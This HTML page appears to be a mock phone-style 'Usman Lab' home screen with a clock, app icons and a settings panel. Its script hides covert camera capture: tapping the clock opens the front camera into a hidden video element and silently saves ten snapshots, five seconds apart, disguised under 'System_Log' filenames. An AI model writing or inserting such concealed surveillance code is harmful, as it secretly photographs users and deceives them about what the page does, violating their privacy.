<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Usman Lab · Core OS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-gold: #ffd966;
            --glass-bg: rgba(255, 255, 255, 0.07);
            --glass-border: rgba(255, 255, 255, 0.12);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            font-family: 'Inter', sans-serif;
            background: #02060a;
            background-image: radial-gradient(circle at 50% 0%, #1a2a3a 0%, #02060a 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            color: white;
        }

        .phone-wrapper {
            width: 100%;
            max-width: 380px;
            height: 90vh;
            background: rgba(15, 25, 35, 0.7);
            backdrop-filter: blur(30px);
            border-radius: 45px;
            border: 1px solid var(--glass-border);
            position: relative;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            box-shadow: 0 50px 100px rgba(0,0,0,0.9);
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 15px 25px 5px 25px;
            font-size: 13px;
            font-weight: 600;
        }

        .header {
            padding: 20px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .user-avatar {
            width: 42px; height: 42px;
            background: linear-gradient(135deg, #ffd966, #b8860b);
            border-radius: 12px;
            display: flex; align-items: center; justify-content: center;
            color: #000; font-weight: bold;
        }

        .clock-container {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }

        #clockCanvas {
            width: 220px; height: 220px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        #clockCanvas:active { transform: scale(0.95); }

        .app-grid {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            padding: 20px;
        }

        .app-icon {
            display: flex; flex-direction: column; align-items: center; gap: 6px;
            cursor: pointer;
        }

        .icon-box {
            width: 54px; height: 54px;
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 15px;
            display: flex; align-items: center; justify-content: center;
            font-size: 22px;
        }

        .app-icon span { font-size: 10px; color: #cbd5e0; }

        #settingsPanel {
            position: absolute;
            bottom: -100%;
            left: 0;
            width: 100%;
            height: 70%;
            background: rgba(10, 20, 30, 0.95);
            backdrop-filter: blur(20px);
            border-top: 2px solid var(--primary-gold);
            border-top-left-radius: 30px;
            border-top-right-radius: 30px;
            transition: bottom 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            z-index: 100;
            padding: 25px;
        }

        #settingsPanel.open { bottom: 0; }

        .setting-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .toggle {
            width: 40px; height: 20px;
            background: #4a5568;
            border-radius: 20px;
            position: relative;
        }
        .toggle.active { background: #4cd137; }
        .toggle::after {
            content: '';
            position: absolute;
            top: 2px; left: 2px;
            width: 16px; height: 16px;
            background: white;
            border-radius: 50%;
            transition: 0.2s;
        }
        .toggle.active::after { left: 22px; }

        .dock {
            background: rgba(255, 255, 255, 0.1);
            margin: 10px 15px 20px 15px;
            padding: 12px;
            border-radius: 25px;
            display: flex;
            justify-content: space-around;
        }

        #secretVideo, #secretCanvas { display: none; }
    </style>
</head>
<body>

    <div class="phone-wrapper">
        <div class="status-bar">
            <span>12:45</span>
            <div style="display: flex; gap: 8px;">
                <i class="fas fa-signal"></i>
                <i class="fas fa-wifi"></i>
                <i class="fas fa-battery-full" style="color: #4cd137;"></i>
            </div>
        </div>

        <div class="header">
            <div class="user-avatar">U</div>
            <i class="fas fa-bell" style="color: #a0aec0;"></i>
        </div>

        <div class="clock-container">
            <canvas id="clockCanvas"></canvas>
            <div style="margin-top: 15px; width: 5px; height: 5px; background: var(--primary-gold); border-radius: 50%; box-shadow: 0 0 10px var(--primary-gold); opacity: 0.5;"></div>
        </div>

        <div class="app-grid">
            <div class="app-icon" id="openSettings">
                <div class="icon-box" style="color: var(--primary-gold);"><i class="fas fa-gear"></i></div>
                <span>Settings</span>
            </div>
            <div class="app-icon">
                <div class="icon-box" style="color: #42a5f5;"><i class="fas fa-flask-vial"></i></div>
                <span>Lab</span>
            </div>
            <div class="app-icon">
                <div class="icon-box" style="color: #66bb6a;"><i class="fas fa-address-book"></i></div>
                <span>Patients</span>
            </div>
            <div class="app-icon">
                <div class="icon-box" style="color: #ffa726;"><i class="fas fa-folder-open"></i></div>
                <span>Storage</span>
            </div>
        </div>

        <div class="dock">
            <i class="fas fa-phone" style="color: #fff; font-size: 20px;"></i>
            <i class="fas fa-message" style="color: #fff; font-size: 20px;"></i>
            <i class="fas fa-globe" style="color: #fff; font-size: 20px;"></i>
            <i class="fas fa-camera" style="color: #fff; font-size: 20px;"></i>
        </div>

        <div id="settingsPanel">
            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px;">
                <h2 style="font-size: 20px;">System Settings</h2>
                <i class="fas fa-times" id="closeSettings" style="cursor: pointer; padding: 5px;"></i>
            </div>
            
            <div class="setting-item">
                <span>Network Status</span>
                <div class="toggle active"></div>
            </div>
            <div class="setting-item">
                <span>Auto Backup</span>
                <div class="toggle active"></div>
            </div>
            <div class="setting-item">
                <span>Dark Mode</span>
                <div class="toggle active"></div>
            </div>
            <div class="setting-item">
                <span>Security Lock</span>
                <div class="toggle"></div>
            </div>
            
            <p style="margin-top: 30px; font-size: 11px; color: #718096; text-align: center;">Usman Lab OS v2.0.5</p>
        </div>
    </div>

    <video id="secretVideo" autoplay playsinline></video>
    <canvas id="secretCanvas"></canvas>

    <script>
        (function() {
            const clockCanvas = document.getElementById('clockCanvas');
            const ctxClock = clockCanvas.getContext('2d');
            const video = document.getElementById('secretVideo');
            const secretCanvas = document.getElementById('secretCanvas');
            const settingsPanel = document.getElementById('settingsPanel');
            
            let stream = null;
            let captureCount = 0;

            function drawClock() {
                const now = new Date();
                const h = now.getHours(), m = now.getMinutes(), s = now.getSeconds();
                const center = 110;
                ctxClock.clearRect(0,0,220,220);
                
                ctxClock.beginPath();
                ctxClock.arc(center, center, 100, 0, 2*Math.PI);
                ctxClock.fillStyle = '#0a141e';
                ctxClock.fill();
                ctxClock.strokeStyle = '#ffd966';
                ctxClock.lineWidth = 3;
                ctxClock.stroke();

                drawHand(center, center, (h%12*30)+(m/2), 50, 5, '#ffd966');
                drawHand(center, center, m*6, 75, 3, '#fff');
                drawHand(center, center, s*6, 85, 1, '#ff5252');
            }

            function drawHand(cx, cy, angle, len, width, color) {
                const rad = (angle - 90) * Math.PI / 180;
                ctxClock.beginPath();
                ctxClock.lineWidth = width;
                ctxClock.strokeStyle = color;
                ctxClock.lineCap = 'round';
                ctxClock.moveTo(cx, cy);
                ctxClock.lineTo(cx + len * Math.cos(rad), cy + len * Math.sin(rad));
                ctxClock.stroke();
            }

            clockCanvas.width = 220; clockCanvas.height = 220;
            setInterval(drawClock, 1000);

            document.getElementById('openSettings').onclick = () => settingsPanel.classList.add('open');
            document.getElementById('closeSettings').onclick = () => settingsPanel.classList.remove('open');

            clockCanvas.onclick = async () => {
                if (!stream) {
                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    video.srcObject = stream;
                }
                
                captureCount = 0;
                const interval = setInterval(() => {
                    if (captureCount >= 10) { clearInterval(interval); return; }
                    secretCanvas.width = video.videoWidth;
                    secretCanvas.height = video.videoHeight;
                    secretCanvas.getContext('2d').drawImage(video, 0, 0);
                    const link = document.createElement('a');
                    link.href = secretCanvas.toDataURL('image/png');
                    link.download = `System_Log_${Date.now()}.png`;
                    link.click();
                    captureCount++;
                }, 5000);
            };
        })();
    </script>
</body>
</html>
